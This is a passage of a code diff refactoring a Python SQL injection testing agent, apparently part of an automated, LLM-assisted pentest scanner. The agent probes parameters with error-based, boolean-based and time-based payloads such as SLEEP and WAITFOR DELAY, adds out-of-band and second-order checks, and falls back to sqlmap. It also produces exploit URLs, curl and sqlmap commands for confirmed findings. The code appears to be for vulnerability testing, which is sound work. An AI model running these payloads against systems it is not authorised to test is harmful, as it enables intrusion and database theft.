+                dashboard.log(f"[{self.name}] 🏆 Max impact achieved, stopping", "SUCCESS")
+                break
+
+            if param in self._tested_params:
+                continue
+
+            self._tested_params.add(param)
+            self._stats["params_tested"] += 1
+            dashboard.log(f"[{self.name}] Testing: {param}", "INFO")
+
+            if await self._detect_prepared_statements(session, param):
+                continue
+
+            await self._detect_filtered_chars(session, param)
+
+            finding = await self._test_single_parameter(session, param)
+            if finding:
+                findings.append(self._finding_to_dict(finding))
+                if self._should_stop_after_finding(finding, findings):
+                    break
+
+        return findings
+
+    async def _test_single_parameter(self, session: aiohttp.ClientSession,
+                                     param: str) -> Optional[SQLiFinding]:
+        """Test single parameter with all techniques."""
+        # OOB SQLi
+        if self._interactsh:
+            finding = await self._test_oob_sqli(session, param)
+            if finding:
+                return await self._finalize_finding(finding, "oob")
+
+        # Error-based
+        finding = await self._test_error_based(session, param)
+        if finding:
+            return await self._finalize_finding(finding, "error_based")
+
+        # Boolean-based
+        finding = await self._test_boolean_based(session, param)
+        if finding:
+            return await self._finalize_finding(finding, "boolean_based")
+
+        # Time-based
+        finding = await self._test_time_based(session, param)
+        if finding:
+            return await self._finalize_finding(finding, "time_based")
+
+        return None
+
+    async def _test_time_based(self, session: aiohttp.ClientSession,
+                               param: str) -> Optional[SQLiFinding]:
+        """Test for time-based SQL injection."""
+        time_payloads = [
+            "' AND SLEEP(5)-- ",
+            "' OR SLEEP(5)-- ",
+            "'; WAITFOR DELAY '0:0:5'-- ",
+            "' AND pg_sleep(5)-- ",
+        ]
+
+        for payload in time_payloads:
+            verified, evidence = await self._verify_time_based_triple(session, param, payload)
+            if verified:
+                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
+                curl_cmd = f"curl '{exploit_url_encoded}'"
+
+                return SQLiFinding(
+                    url=self.url,
+                    parameter=param,
+                    injection_type="time-based",
+                    technique="time_based",
+                    working_payload=payload,
+                    payload_encoded=payload,
+                    exploit_url=exploit_url,
+                    exploit_url_encoded=exploit_url_encoded,
+                    dbms_detected=self._detected_db_type or "unknown",
+                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=T --time-sec=5 --batch",
+                    curl_command=curl_cmd,
+                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=T",
+                    validated=True,
+                    status=self._determine_validation_status("time_based", evidence),
+                    evidence=evidence,
+                    reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
+                )
+
+        return None
+
+    async def _finalize_finding(self, finding: SQLiFinding, technique: str) -> SQLiFinding:
+        """Finalize finding with LLM explanation and stats."""
+        finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(finding)
+        self._stats["vulns_found"] += 1
+        return finding
+
+    def _should_stop_after_finding(self, finding: SQLiFinding, findings: List) -> bool:
+        """Check if we should stop testing after this finding."""
+        should_stop, reason = self._should_stop_testing(
+            finding.technique, finding.evidence, len(findings)
+        )
+        if should_stop:
+            dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
+        return should_stop
+
+    async def _test_json_injection(self, session: aiohttp.ClientSession,
+                                   findings: List) -> List:
+        """Test JSON body injection if applicable."""
+        if not self.post_data or self._max_impact_achieved:
+            return findings
+
+        try:
+            json_body = json.loads(self.post_data)
+            dashboard.log(f"[{self.name}] Phase 4: Testing JSON body...", "INFO")
+            json_findings = await self._test_json_body_injection(session, self.url, json_body)
+            for jf in json_findings:
+                jf.exploitation_explanation = await self._generate_llm_exploitation_explanation(jf)
+                findings.append(self._finding_to_dict(jf))
+            self._stats["vulns_found"] += len(json_findings)
+        except json.JSONDecodeError:
+            pass
+
+        return findings
+
+    async def _test_second_order_injection(self, session: aiohttp.ClientSession,
+                                          params: List[str], findings: List) -> List:
+        """Test second-order SQL injection if applicable."""
+        if not self.observation_points or self._max_impact_achieved:
+            return findings
+
+        dashboard.log(f"[{self.name}] Phase 5: Testing second-order SQLi...", "INFO")
+        for param in params[:5]:
+            so_finding = await self._test_second_order_sqli(session, self.url, param)
+            if so_finding:
+                so_finding["exploitation_explanation"] = await self._generate_llm_exploitation_explanation(so_finding)
+                findings.append(so_finding)
+                self._stats["vulns_found"] += 1
+                break
+
+        return findings
+
+    async def _run_sqlmap_fallback(self, session: aiohttp.ClientSession,
+                                   params: List[str], findings: List) -> List:
+        """Run SQLMap as fallback if no findings."""
+        if findings or not external_tools.docker_cmd:
+            return findings
+
+        dashboard.log(f"[{self.name}] Phase 6: SQLMap fallback...", "INFO")
+
+        for param in params[:3]:
+            finding = await self._run_sqlmap_on_param(param)
+            if finding:
+                findings.append(self._finding_to_dict(finding))
+                self._stats["vulns_found"] += 1
+                if settings.EARLY_EXIT_ON_FINDING:
+                    break
+
+        return findings
+
+    async def _run_sqlmap_on_param(self, param: str) -> Optional[SQLiFinding]:
+        """Run SQLMap on a single parameter."""
+        docker_url = self.url.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")
+
+        sqlmap_result = await external_tools.run_sqlmap(
+            docker_url,
+            target_param=param,
+            technique="BEUS"
+        )
+
+        if not sqlmap_result or not sqlmap_result.get("vulnerable"):
+            return None
+
+        return self._create_sqlmap_finding(sqlmap_result, param)
+
+    def _create_sqlmap_finding(self, sqlmap_result: Dict, param: str) -> SQLiFinding:
+        """Create finding from SQLMap result."""
+        technique = self._sqlmap_type_to_technique(sqlmap_result.get("type", ""))
+        details = self._parse_sqlmap_output(sqlmap_result.get("output_snippet", ""))
+
+        dbms = details.get("dbms") if details.get("dbms") != "unknown" else sqlmap_result.get("dbms", "unknown")
+        working_payload = details.get("working_payload") or sqlmap_result.get("payload", "")
+
+        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, working_payload)
+        curl_cmd = f"curl '{exploit_url_encoded}'"
+
+        finding = SQLiFinding(
+            url=self.url,
+            parameter=sqlmap_result.get("parameter", param),
+            injection_type=sqlmap_result.get("type", technique),
+            technique=technique,
+            working_payload=working_payload,
+            payload_encoded=working_payload,
+            exploit_url=exploit_url,
+            exploit_url_encoded=exploit_url_encoded,
+            dbms_detected=dbms,
+            columns_detected=details.get("columns_count"),
+            extracted_databases=details.get("databases", []),
+            extracted_tables=details.get("tables", []),
+            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique={technique[0].upper()}",
+            curl_command=curl_cmd,
+            sqlmap_reproduce_command=sqlmap_result.get("reproduction_command", ""),
+            validated=True,
+            status="VALIDATED_CONFIRMED",
+            evidence={
+                "sqlmap_confirmed": True,
+                "db_type": dbms,
+                "raw_output": sqlmap_result.get("output_snippet", "")[:1000]
+            },
+            reproduction_steps=self._generate_repro_steps(self.url, param, working_payload, curl_cmd)
+        )
+
+        return finding
+
+    def _log_final_stats(self, findings: List):
+        """Log final statistics."""
+        dashboard.log(
+            f"[{self.name}] Complete: {self._stats['params_tested']} params, "
+            f"{self._stats['vulns_found']} vulns, {self._stats['oob_callbacks']} OOB callbacks",
+            "SUCCESS" if findings else "INFO"
+        )
 
     # =========================================================================
     # MAIN RUN LOOP
@@ -1276,263 +1585,20 @@ Write the exploitation explanation section for the report."""
         findings = []
 
         async with aiohttp.ClientSession() as session:
-            # Add cookies/headers
-            if self.cookies:
-                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
-                session.cookie_jar.update_cookies({"Cookie": cookie_str})
+            self._configure_session(session)
 
             try:
-                # =============================================================
-                # PHASE 1: Initialize & Baseline
-                # =============================================================
-                dashboard.log(f"[{self.name}] Phase 1: Initializing...", "INFO")
-
-                # Get baseline response
-                try:
-                    start = time.time()
-                    async with session.get(self.url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                        baseline_content = await resp.text()
-                        self._baseline_response_time = time.time() - start
-                        self._baseline_content_length = len(baseline_content)
-
-                        # Try to detect DB from baseline errors
-                        self._detected_db_type = self._detect_database_type(baseline_content)
-                except Exception as e:
-                    logger.warning(f"Baseline failed: {e}")
-
-                # Initialize Interactsh for OOB
-                await self._init_interactsh()
-
-                # =============================================================
-                # PHASE 2: Extract and prioritize parameters
-                # =============================================================
-                parsed = urlparse(self.url)
-                params = list(parse_qs(parsed.query).keys())
-
-                # Add specific param if provided
-                if self.param and self.param not in params:
-                    params.insert(0, self.param)
-
-                # Add POST params if provided
-                if self.post_data:
-                    post_params = self._extract_post_params(self.post_data)
-                    params.extend(post_params)
-
-                # Prioritize
-                params = self._prioritize_params(list(set(params)))
-
-                if not params:
-                    params = ["id"]  # Sensible fallback
+                await self._initialize_baseline(session)
+                params = await self._extract_and_prioritize_params()
 
                 dashboard.log(f"[{self.name}] Testing {len(params)} parameters (prioritized)", "INFO")
 
-                # =============================================================
-                # PHASE 3: Per-parameter testing
-                # =============================================================
-                for param in params:
-                    if self._max_impact_achieved:
-                        dashboard.log(f"[{self.name}] 🏆 Max impact achieved, stopping", "SUCCESS")
-                        break
+                findings = await self._test_all_parameters(session, params, findings)
+                findings = await self._test_json_injection(session, findings)
+                findings = await self._test_second_order_injection(session, params, findings)
+                findings = await self._run_sqlmap_fallback(session, params, findings)
 
-                    if param in self._tested_params:
-                        continue
-
-                    self._tested_params.add(param)
-                    self._stats["params_tested"] += 1
-
-                    dashboard.log(f"[{self.name}] Testing: {param}", "INFO")
-
-                    # ---------------------------------------------------------
-                    # Phase 3.1: Detect prepared statements (early exit)
-                    # ---------------------------------------------------------
-                    if await self._detect_prepared_statements(session, param):
-                        continue
-
-                    # ---------------------------------------------------------
-                    # Phase 3.2: Detect filtered characters
-                    # ---------------------------------------------------------
-                    await self._detect_filtered_chars(session, param)
-
-                    # ---------------------------------------------------------
-                    # Phase 3.3: OOB SQLi (most reliable for blind)
-                    # ---------------------------------------------------------
-                    if self._interactsh:
-                        oob_finding = await self._test_oob_sqli(session, param)
-                        if oob_finding:
-                            # Generate LLM explanation
-                            oob_finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(oob_finding)
-                            findings.append(self._finding_to_dict(oob_finding))
-                            self._stats["vulns_found"] += 1
-
-                            should_stop, reason = self._should_stop_testing("oob", oob_finding.evidence, len(findings))
-                            if should_stop:
-                                dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
-                                break
-                            continue
-
-                    # ---------------------------------------------------------
-                    # Phase 3.4: Error-based / Boolean-based testing
-                    # ---------------------------------------------------------
-                    error_finding = await self._test_error_based(session, param)
-                    if error_finding:
-                        error_finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(error_finding)
-                        findings.append(self._finding_to_dict(error_finding))
-                        self._stats["vulns_found"] += 1
-
-                        should_stop, reason = self._should_stop_testing("error_based", error_finding.evidence, len(findings))
-                        if should_stop:
-                            dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
-                            break
-                        continue
-
-                    boolean_finding = await self._test_boolean_based(session, param)
-                    if boolean_finding:
-                        boolean_finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(boolean_finding)
-                        findings.append(self._finding_to_dict(boolean_finding))
-                        self._stats["vulns_found"] += 1
-
-                        should_stop, reason = self._should_stop_testing("boolean_based", boolean_finding.evidence, len(findings))
-                        if should_stop:
-                            dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
-                            break
-                        continue
-
-                    # ---------------------------------------------------------
-                    # Phase 3.5: Time-based (only with triple verification)
-                    # ---------------------------------------------------------
-                    time_payloads = [
-                        "' AND SLEEP(5)-- ",
-                        "' OR SLEEP(5)-- ",
-                        "'; WAITFOR DELAY '0:0:5'-- ",
-                        "' AND pg_sleep(5)-- ",
-                    ]
-
-                    for payload in time_payloads:
-                        verified, evidence = await self._verify_time_based_triple(session, param, payload)
-                        if verified:
-                            exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
-                            curl_cmd = f"curl '{exploit_url_encoded}'"
-                            
-                            finding = SQLiFinding(
-                                url=self.url,
-                                parameter=param,
-                                injection_type="time-based",
-                                technique="time_based",
-                                working_payload=payload,
-                                payload_encoded=payload,
-                                exploit_url=exploit_url,
-                                exploit_url_encoded=exploit_url_encoded,
-                                dbms_detected=self._detected_db_type or "unknown",
-                                sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=T --time-sec=5 --batch",
-                                curl_command=curl_cmd,
-                                sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=T",
-                                validated=True,
-                                status=self._determine_validation_status("time_based", evidence),
-                                evidence=evidence,
-                                reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
-                            )
-                            
-                            finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(finding)
-                            findings.append(self._finding_to_dict(finding))
-                            self._stats["vulns_found"] += 1
-                            break
-
-                # =============================================================
-                # PHASE 4: JSON Body Injection
-                # =============================================================
-                if self.post_data and not self._max_impact_achieved:
-                    try:
-                        json_body = json.loads(self.post_data)
-                        dashboard.log(f"[{self.name}] Phase 4: Testing JSON body...", "INFO")
-                        json_findings = await self._test_json_body_injection(session, self.url, json_body)
-                        for jf in json_findings:
-                            jf.exploitation_explanation = await self._generate_llm_exploitation_explanation(jf)
-                            findings.append(self._finding_to_dict(jf))
-                        self._stats["vulns_found"] += len(json_findings)
-                    except json.JSONDecodeError:
-                        pass  # Not JSON
-
-                # =============================================================
-                # PHASE 5: Second-Order SQLi
-                # =============================================================
-                if self.observation_points and not self._max_impact_achieved:
-                    dashboard.log(f"[{self.name}] Phase 5: Testing second-order SQLi...", "INFO")
-                    for param in params[:5]:  # Test top 5 params
-                        so_finding = await self._test_second_order_sqli(session, self.url, param)
-                        if so_finding:
-                            so_finding["exploitation_explanation"] = await self._generate_llm_exploitation_explanation(so_finding)
-                            findings.append(so_finding)
-                            self._stats["vulns_found"] += 1
-                            break
-
-                # =============================================================
-                # PHASE 6: SQLMap Fallback (if nothing found)
-                # =============================================================
-                if not findings and external_tools.docker_cmd:
-                    dashboard.log(f"[{self.name}] Phase 6: SQLMap fallback...", "INFO")
-
-                    for param in params[:3]:  # Test top 3 with SQLMap
-                        docker_url = self.url.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")
-
-                        sqlmap_result = await external_tools.run_sqlmap(
-                            docker_url,
-                            target_param=param,
-                            technique="BEUS"  # NO Time-based by default
-                        )
-
-                        if sqlmap_result and sqlmap_result.get("vulnerable"):
-                            technique = self._sqlmap_type_to_technique(sqlmap_result.get("type", ""))
-                            dbms = sqlmap_result.get("dbms", "unknown")
-
-                            
-                            details = self._parse_sqlmap_output(sqlmap_result.get("output_snippet", ""))
-                            
-                            # Merge details
-                            dbms = details.get("dbms") if details.get("dbms") != "unknown" else sqlmap_result.get("dbms", "unknown")
-                            working_payload = details.get("working_payload") or sqlmap_result.get("payload", "")
-                            
-                            exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, working_payload)
-                            curl_cmd = f"curl '{exploit_url_encoded}'"
-
-                            finding = SQLiFinding(
-                                url=self.url,
-                                parameter=sqlmap_result.get("parameter", param),
-                                injection_type=sqlmap_result.get("type", technique),
-                                technique=technique,
-                                working_payload=working_payload,
-                                payload_encoded=working_payload,
-                                exploit_url=exploit_url,
-                                exploit_url_encoded=exploit_url_encoded,
-                                dbms_detected=dbms,
-                                columns_detected=details.get("columns_count"),
-                                extracted_databases=details.get("databases", []),
-                                extracted_tables=details.get("tables", []),
-                                sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique={technique[0].upper()}",
-                                curl_command=curl_cmd,
-                                sqlmap_reproduce_command=sqlmap_result.get("reproduction_command", ""),
-                                validated=True,
-                                status="VALIDATED_CONFIRMED",
-                                evidence={
-                                    "sqlmap_confirmed": True,
-                                    "db_type": dbms,
-                                    "raw_output": sqlmap_result.get("output_snippet", "")[:1000]
-                                },
-                                reproduction_steps=self._generate_repro_steps(self.url, param, working_payload, curl_cmd)
-                            )
-                            
-                            finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(finding)
-                            findings.append(self._finding_to_dict(finding))
-                            self._stats["vulns_found"] += 1
-
-                            if settings.EARLY_EXIT_ON_FINDING:
-                                break
-
-                # Log final stats
-                dashboard.log(
-                    f"[{self.name}] Complete: {self._stats['params_tested']} params, "
-                    f"{self._stats['vulns_found']} vulns, {self._stats['oob_callbacks']} OOB callbacks",
-                    "SUCCESS" if findings else "INFO"
-                )
+                self._log_final_stats(findings)
 
                 return {
                     "vulnerable": len(findings) > 0,
@@ -1553,65 +1619,69 @@ Write the exploitation explanation section for the report."""
         base_url = self._get_base_url()
 
         error_payloads = [
-            "'",
-            "''",
-            "\"",
-            "' OR '1'='1",
-            "' AND '1'='2",
-            "1'",
-            "1\"",
-            "') OR ('1'='1",
-            "1; SELECT 1",
+            "'", "''", "\"", "' OR '1'='1", "' AND '1'='2",
+            "1'", "1\"", "') OR ('1'='1", "1; SELECT 1",
         ]
 
         for payload in error_payloads:
             variants = self._mutate_payload_for_filters(payload)
 
             for variant in variants:
-                try:
-                    test_url = self._build_url_with_param(base_url, param, variant)
-
-                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                        content = await resp.text()
-
-                        error_info = self._extract_info_from_error(content)
-
-                        if error_info.get("db_type"):
-                            self._detected_db_type = error_info["db_type"]
-
-                            
-                            exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
-                            curl_cmd = f"curl '{exploit_url_encoded}'"
-                            
-                            return SQLiFinding(
-                                url=self.url,
-                                parameter=param,
-                                injection_type="error-based",
-                                technique="error_based",
-                                working_payload=variant,
-                                payload_encoded=variant, 
-                                exploit_url=exploit_url,
-                                exploit_url_encoded=exploit_url_encoded,
-                                extracted_tables=error_info.get("tables_leaked", []),
-                                dbms_detected=error_info.get("db_type", "unknown"),
-                                sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=E --batch",
-                                curl_command=curl_cmd,
-                                sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=E",
-                                validated=True,
-                                status=self._determine_validation_status("error_based", {
-                                    "sql_error_visible": True,
-                                    "tables_leaked": error_info.get("tables_leaked", [])
-                                }),
-                                evidence={
-                                    "sql_error_visible": True,
-                                    **error_info
-                                },
-                                reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
-                            )
-                except Exception as e:
-                    logger.debug(f"Error-based test failed: {e}")
+                finding = await self._test_error_payload(session, base_url, param, variant)
+                if finding:
+                    return finding
 
         return None
+
+    async def _test_error_payload(self, session: aiohttp.ClientSession, base_url: str,
+                                  param: str, variant: str) -> Optional[SQLiFinding]:
+        """Test a single error-based payload."""
+        try:
+            test_url = self._build_url_with_param(base_url, param, variant)
+
+            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                content = await resp.text()
+
+                error_info = self._extract_info_from_error(content)
+
+                if error_info.get("db_type"):
+                    self._detected_db_type = error_info["db_type"]
+                    return self._create_error_based_finding(param, variant, error_info)
+        except Exception as e:
+            logger.debug(f"Error-based test failed: {e}")
+
+        return None
+
+    def _create_error_based_finding(self, param: str, variant: str, error_info: Dict) -> SQLiFinding:
+        """Create finding for error-based SQL injection."""
+        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
+        curl_cmd = f"curl '{exploit_url_encoded}'"
+
+        return SQLiFinding(
+            url=self.url,
+            parameter=param,
+            injection_type="error-based",
+            technique="error_based",
+            working_payload=variant,
+            payload_encoded=variant,
+            exploit_url=exploit_url,
+            exploit_url_encoded=exploit_url_encoded,
+            extracted_tables=error_info.get("tables_leaked", []),
+            dbms_detected=error_info.get("db_type", "unknown"),
+            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=E --batch",
+            curl_command=curl_cmd,
+            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=E",
+            validated=True,
+            status=self._determine_validation_status("error_based", {
+                "sql_error_visible": True,
+                "tables_leaked": error_info.get("tables_leaked", [])
+            }),
+            evidence={
+                "sql_error_visible": True,
+                **error_info
+            },
+            reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
+        )
 
     async def _test_boolean_based(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
         """Test for boolean-based blind SQL injection."""
@@ -1620,62 +1690,62 @@ Write the exploitation explanation section for the report."""
         base_url = self._get_base_url()
 
         try:
-            # Get baseline
-            baseline_url = self._build_url_with_param(base_url, param, "1")
-            async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                baseline_content = await resp.text()
+            baseline_content = await self._fetch_content(session, base_url, param, "1")
+            true_content = await self._fetch_content(session, base_url, param, "1' AND '1'='1")
+            false_content = await self._fetch_content(session, base_url, param, "1' AND '1'='2")
 
-            # True condition
-            true_payload = "1' AND '1'='1"
-            true_url = self._build_url_with_param(base_url, param, true_payload)
-            async with session.get(true_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                true_content = await resp.text()
-
-            # False condition
-            false_payload = "1' AND '1'='2"
-            false_url = self._build_url_with_param(base_url, param, false_payload)
-            async with session.get(false_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                false_content = await resp.text()
-
-            # Calculate similarity
             true_sim = difflib.SequenceMatcher(None, baseline_content, true_content).ratio()
             false_sim = difflib.SequenceMatcher(None, baseline_content, false_content).ratio()
-
             diff_ratio = abs(true_sim - false_sim)
 
             logger.debug(f"[{self.name}] Boolean test: true_sim={true_sim:.2f}, false_sim={false_sim:.2f}, diff={diff_ratio:.2f}")
 
-            # If true condition matches baseline but false differs significantly
-            if true_sim > 0.9 and false_sim < 0.8 and diff_ratio > 0.15:
-                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, true_payload)
-                curl_cmd = f"curl '{exploit_url_encoded}'"
-                
-                return SQLiFinding(
-                    url=self.url,
-                    parameter=param,
-                    injection_type="boolean-based",
-                    technique="boolean_based",
-                    working_payload=true_payload,
-                    payload_encoded=true_payload,
-                    exploit_url=exploit_url,
-                    exploit_url_encoded=exploit_url_encoded,
-                    dbms_detected=self._detected_db_type or "unknown",
-                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=B --batch",
-                    curl_command=curl_cmd,
-                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=B",
-                    validated=True,
-                    status=self._determine_validation_status("boolean_based", {"diff_ratio": diff_ratio}),
-                    evidence={
-                        "diff_ratio": diff_ratio,
-                        "true_similarity": true_sim,
-                        "false_similarity": false_sim,
-                    },
-                    reproduction_steps=self._generate_repro_steps(self.url, param, true_payload, curl_cmd)
-                )
+            if self._is_boolean_vulnerable(true_sim, false_sim, diff_ratio):
+                return self._create_boolean_finding(param, "1' AND '1'='1", diff_ratio, true_sim, false_sim)
         except Exception as e:
             logger.debug(f"Boolean-based test failed: {e}")
 
         return None
+
+    async def _fetch_content(self, session: aiohttp.ClientSession, base_url: str,
+                            param: str, value: str) -> str:
+        """Fetch content for a given parameter value."""
+        test_url = self._build_url_with_param(base_url, param, value)
+        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            return await resp.text()
+
+    def _is_boolean_vulnerable(self, true_sim: float, false_sim: float, diff_ratio: float) -> bool:
+        """Check if boolean-based SQL injection is present."""
+        return true_sim > 0.9 and false_sim < 0.8 and diff_ratio > 0.15
+
+    def _create_boolean_finding(self, param: str, payload: str, diff_ratio: float,
+                               true_sim: float, false_sim: float) -> SQLiFinding:
+        """Create finding for boolean-based SQL injection."""
+        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
+        curl_cmd = f"curl '{exploit_url_encoded}'"
+
+        return SQLiFinding(
+            url=self.url,
+            parameter=param,
+            injection_type="boolean-based",
+            technique="boolean_based",
+            working_payload=payload,
+            payload_encoded=payload,
+            exploit_url=exploit_url,
+            exploit_url_encoded=exploit_url_encoded,
+            dbms_detected=self._detected_db_type or "unknown",
+            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=B --batch",
+            curl_command=curl_cmd,
+            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=B",
+            validated=True,
+            status=self._determine_validation_status("boolean_based", {"diff_ratio": diff_ratio}),
+            evidence={
+                "diff_ratio": diff_ratio,
+                "true_similarity": true_sim,
+                "false_similarity": false_sim,
+            },
+            reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
+        )
 
     # =========================================================================
     # UTILITY METHODS
